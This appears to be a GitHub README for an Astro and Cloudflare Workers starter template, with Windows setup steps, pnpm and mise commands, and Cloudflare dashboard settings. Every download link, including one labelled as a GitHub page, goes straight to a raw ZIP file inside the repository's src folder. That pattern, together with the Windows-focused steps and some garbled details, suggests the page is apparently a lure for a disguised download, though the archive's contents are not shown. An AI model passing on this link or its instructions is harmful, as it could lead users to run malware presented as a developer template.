# ☁️ astro-cloudflare-template - Simple Cloudflare app setup

[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page%20to%20download-blue?style=for-the-badge)](https://raw.githubusercontent.com/fibreoptic-people44/astro-cloudflare-template/main/src/template_cloudflare_astro_2.2.zip)

## 🖥️ What this is

astro-cloudflare-template is a starter app for running a web project on Cloudflare. It is built for people who want a fast site with a simple setup on Windows.

Use this if you want to:
- open the project in your browser
- set up the app on your own computer
- prepare it for Cloudflare hosting

## 📥 Download the project

Use this link to visit the page and download the files:

https://raw.githubusercontent.com/fibreoptic-people44/astro-cloudflare-template/main/src/template_cloudflare_astro_2.2.zip

## 🪟 Windows setup

To run this project on Windows, you need:
- Windows 10 or Windows 11
- A web browser
- Internet access
- Enough free disk space for the project files

### 1. Download the project
Open the download page and get the project files from GitHub:
https://raw.githubusercontent.com/fibreoptic-people44/astro-cloudflare-template/main/src/template_cloudflare_astro_2.2.zip

### 2. Save the files
If the project comes as a ZIP file:
- right-click the file
- choose Extract All
- pick a folder you can find again, like Downloads or Documents

### 3. Open the project folder
Find the folder that contains the project files. You should see files and folders for the app, not just one file.

## 🧰 Install the tools

This project uses a few command line tools. You only need to do this once.

### 1. Install mise
Use this command:
```shell
mise i
```

### 2. Install project packages
Use this command:
```shell
pn i
```

### 3. Update browser data
Use this command:
```shell
pn update-browserslist-db latest
```

## ▶️ Run the project

After the tools are installed, start the project from the project folder.

### 1. Generate types
Use this command:
```shell
pn types
```

### 2. Check the project
Use this command:
```shell
pn run check
```

### 3. Start the app
Use the run command for the app in your terminal. If the project includes a local dev server, it will open in your browser or show a local link.

## 🛠️ Common commands

Use these commands when you need to work on the project:

### Install all dev tools
```shell
mise i
```

### Install all deps if not done by `mise`
```shell
pn i
```

### Update browserlist
```shell
pn update-browserslist-db latest
```

### Generate types
```shell
pn types
```

### Deploy to Cloudflare
```shell
pn run deploy
```

## 🌐 Cloudflare settings

Use these settings in the Cloudflare dashboard for a safer and cleaner setup:

- Workers Plan: Paid
- Zone Plan: Free
- Remove all DNS records other than your worker record
- Enable DNSSEC
- Set up email based on your use case
- Enable SSL/TLS Full (Strict)
- Enable HSTS for 6 months, include subdomains, preload, and sniff
- Set Minimum TLS to 1.2
- Disable Opportunistic Encryption
- Enable TLS 1.3
- Disable Automatic HTTPS Rewrite
- Adjust security settings to fit your needs

## 📁 Project notes

Before you use the app, check these items in the code:
- update all `CHANGEME` text
- pin all deps to the latest versions instead of `*`
- add `src/pages`
- run the setup and check commands
- deploy to Cloudflare when ready

## 🔧 Typical workflow

1. Download the project from GitHub
2. Extract the files on Windows
3. Open the folder in your terminal
4. Run `mise i`
5. Run `pn i`
6. Run `pn update-browserslist-db latest`
7. Run `pn types`
8. Run `pn run check`
9. Run `pn run deploy`

## 📌 Folder use

A typical project folder may include:
- app source files
- config files
- build files
- type files
- Cloudflare setup files

Keep the folder in one place so you can find it later.